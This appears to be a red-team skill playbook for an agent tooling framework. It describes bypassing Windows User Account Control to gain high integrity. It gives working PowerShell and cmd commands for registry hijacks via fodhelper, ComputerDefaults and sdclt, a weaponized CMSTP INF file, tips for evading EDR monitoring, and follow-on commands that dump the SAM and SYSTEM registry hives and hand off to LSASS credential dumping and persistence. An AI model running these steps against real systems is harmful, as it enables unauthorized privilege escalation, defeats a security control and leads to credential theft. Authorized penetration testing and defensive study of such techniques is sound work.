---
name: red-privesc-windows-uac-bypass
description: Bypassing Windows User Account Control (UAC) to escalate from medium to high integrity without user prompts using auto-elevating binaries and registry hijacking.
domain: red
category: privesc
hide: true
license: Apache-2.0
metadata:
  manifest_entry: src/corpus/red-privesc-windows-uac-bypass/SKILL.md
---
# Windows User Account Control (UAC) Bypass & High-Integrity Token Elevation

## When to Use
Execute this operational playbook during post-exploitation on Windows systems when operating in a medium-integrity context as an administrative user (member of local Administrators group `S-1-5-32-544`). Bypassing UAC is necessary to gain high-integrity execution required for LSASS memory extraction, SAM registry hives dumping, driver loading, and security event log manipulation, aligned with MITRE ATT&CK T1548.002.

---

## 1. Operational Decision Tree

```text
                  [Medium-Integrity Shell on Windows Host]
                                     │
                                     ▼
                   [Preflight Integrity & Group Audit]
                whoami /groups -> Must contain S-1-5-32-544
                whoami /priv   -> Medium Mandatory Level
                                     │
                                     ▼
                      [Check UAC Enforcement Level]
             REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\
             Policies\System /v ConsentPromptBehaviorAdmin
                                     │
                     ┌───────────────┴───────────────┐
                     ▼                               ▼
         [ConsentPrompt = 2 (AlwaysNotify)]   [ConsentPrompt = 5 (Default)]
         UAC prompts on ALL elevations        Auto-elevation permitted
                     │                               │
                     ▼                               ▼
         [Requires Exploit / User Click]     [Select Auto-Elevate Vector]
         Kernel exploit / token stealing     - fodhelper.exe (ms-settings)
                                             - ComputerDefaults.exe
                                             - sdclt.exe
                                             - CMSTP.exe / Mock Directories
                                                     │
                                                     ▼
                                        [Execute Registry Hijack]
                                        Write HKCU Classes command
                                        Trigger auto-elevating binary
                                                     │
                                                     ▼
                                         [Immediate Post-Clean]
                                        Delete HKCU volatile keys
                                        (Prevent breaking system UI)
                                                     │
                                                     ▼
                                      [Tripartite Verification Oracle]
                                      Verify High Mandatory Level
                                      Verify SeDebugPrivilege enabled
                                                     │
                                                     ▼
                                      [Evidence Ledger Registration]
                         arsenal append-evidence --case $CASE_ID ...
                                                     │
                                                     ▼
                                      [Downstream Privileged Handoff]
                         - LSASS Dump -> red-credential-access
                         - Persistence -> red-post-exploitation
```

---

## 2. Multi-Stage Tooling Pipeline & Execution

### Stage 1: Preflight Integrity & Environment Verification

Before attempting any elevation vector, verify that the current user belongs to the local Administrators group and that UAC is running under default settings:

```cmd
:: 1. Verify membership in local Administrators group (S-1-5-32-544)
whoami /groups | findstr /i "S-1-5-32-544"

:: 2. Verify current token integrity level (Expect: "Medium Mandatory Level")
whoami /priv
whoami /groups | findstr /i "Mandatory"

:: 3. Query UAC Consent Prompt policy
:: 0 = Elevate without prompting
:: 5 = Prompt for consent for non-Windows binaries (Default - Bypassable)
:: 2 = Always prompt for consent (Not bypassable without kernel/0-day)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
```

---

### Stage 2: Fodhelper Registry Hijacking (Windows 10 / 11)

`fodhelper.exe` (Features on Demand Helper) is a native Microsoft binary signed with `autoElevate = true`. When launched, it searches `HKCU\Software\Classes\ms-settings\Shell\Open\command` before system paths:

```powershell
# Target command to execute with high-integrity (e.g. reverse shell or beacon)
$ElevatedCommand = "cmd.exe /c start C:\Windows\System32\cmd.exe"

# 1. Create registry hijacking structure under HKCU (no admin rights required)
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value $ElevatedCommand -Force | Out-Null

# 2. Trigger auto-elevating binary
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# 3. CRITICAL: Clean up registry key immediately to prevent breaking Windows Settings app
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
```

---

### Stage 3: ComputerDefaults Registry Hijacking

Alternative vector when `fodhelper.exe` is monitored by EDR:

```cmd
:: 1. Set registry hijack
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "" /d "cmd.exe /c start powershell.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f

:: 2. Execute ComputerDefaults
start C:\Windows\System32\ComputerDefaults.exe

:: 3. Clean up registry
timeout /t 3 /nobreak >nul
reg delete "HKCU\Software\Classes\ms-settings" /f
```

---

### Stage 4: Sdclt (Backup and Restore) App Paths Hijack

On earlier Windows 10 builds, `sdclt.exe` queries `Folder\shell\open\command`:

```powershell
# Create hijack key
New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)" -Value "cmd.exe /c start powershell.exe" -Force | Out-Null

# Trigger sdclt
Start-Process "C:\Windows\System32\sdclt.exe"

# Clean up
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction SilentlyContinue
```

---

### Stage 5: CMSTP Profile Execution (Bypassing AppLocker & UAC)

The Microsoft Connection Manager Profile Installer (`cmstp.exe`) automatically elevates INF files containing custom execution commands:

```cmd
:: 1. Generate weaponized INF configuration
(
echo [version]
echo Signature=$chicago$
echo AdvancedINF=2.5
echo [DefaultInstall]
echo CustomDestination=CustInstDestSectionAllUsers
echo RunPreSetupCommands=RunPreSetupCommandsSection
echo [RunPreSetupCommandsSection]
echo C:\Windows\System32\cmd.exe /c start powershell.exe
echo [CustInstDestSectionAllUsers]
echo 49000,49001=AllUSer_LDIDSection, 7
echo [AllUSer_LDIDSection]
echo "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
) > tmp\uac_cmstp.inf

:: 2. Execute silently via cmstp
cmstp.exe /au tmp\uac_cmstp.inf
```

---

## 3. Tripartite Verification Oracle

UAC bypass success is confirmed **only** when three distinct assertions are validated:

```text
+---------------------------------------------------------------------------------------+
|                              TRIPARTITE VERIFICATION ORACLE                            |
+---------------------------------------------------------------------------------------+
| 1. POSITIVE ASSERTION       | Spawned elevated shell verifies High Integrity Token:   |
|                             | - whoami /groups returns:                               |
|                             |   "Mandatory Label\High Mandatory Level"                |
|                             | - whoami /priv contains disabled or enabled:            |
|                             |   "SeDebugPrivilege" AND "SeLoadDriverPrivilege"        |
+-----------------------------+---------------------------------------------------------+
| 2. NEGATIVE BASELINE        | Executing the payload command directly from the original|
|    CONTROL                  | medium-integrity shell:                                 |
|                             | - whoami /groups returns: "Medium Mandatory Level"      |
|                             | - Privileged operations (e.g. reading SAM registry)     |
|                             |   fail with ERROR_ACCESS_DENIED (5).                    |
+-----------------------------+---------------------------------------------------------+
| 3. DIFFERENTIAL INVARIANCE  | Verify that elevated token permits opening a handle to  |
|                             | privileged system processes (e.g. lsass.exe via         |
|                             | PROCESS_QUERY_LIMITED_INFORMATION).                     |
+---------------------------------------------------------------------------------------+
```

---

## 4. False-Positive & Edge-Case Elimination

- **UAC AlwaysNotify Gating**: If the registry value `ConsentPromptBehaviorAdmin` is set to `2`, Windows triggers a secure desktop prompt for all elevation events regardless of binary signatures. Verify this key during Stage 1; do not attempt registry hijacking if set to `2`.
- **EDR Registry Monitoring**: Advanced EDRs (Defender for Endpoint, CrowdStrike, SentinelOne) monitor write operations to `HKCU\Software\Classes\ms-settings`. Ensure immediate cleanup within 3 seconds of execution, or pivot to mock system directory execution (`C:\Windows \System32`).
- **Standard User Accounts**: UAC bypass vectors only function if the executing account is already a local administrator running under token filtering. A standard user account (`S-1-5-32-545` only) will prompt for administrative credentials, causing bypass failure.

---

## 5. Evidence Capture & Ledger Registration

Persist elevation verification into Arsenal's cryptographic evidence pipeline:

```bash
# 1. Capture elevated token integrity output
cmd.exe /c "whoami /groups & whoami /priv" > work/$CASE_ID/evidence/raw/uac_elevation_token.txt

# 2. Append evidence entry to cryptographic audit ledger
arsenal append-evidence \
  --case $CASE_ID \
  --tool cmd \
  --file work/$CASE_ID/evidence/raw/uac_elevation_token.txt \
  --desc "Confirmed Windows UAC bypass achieving High Mandatory Level token"
```

---

## 6. Kill-Chain Chaining & Downstream Handoffs

- **Prerequisites**: Active medium-integrity shell with local Administrator rights on target Windows host.
- **Downstream Handoffs**:
  - **Credential Access**: Use high-integrity token to dump credentials from memory (`red-credential-access-lsass-memory-dumping`).
  - **Registry Export**: Dump local security hives:
    ```cmd
    reg save HKLM\SAM work\sam.save
    reg save HKLM\SYSTEM work\system.save
    ```
  - **Persistence**: Install persistent high-integrity service or scheduled task.
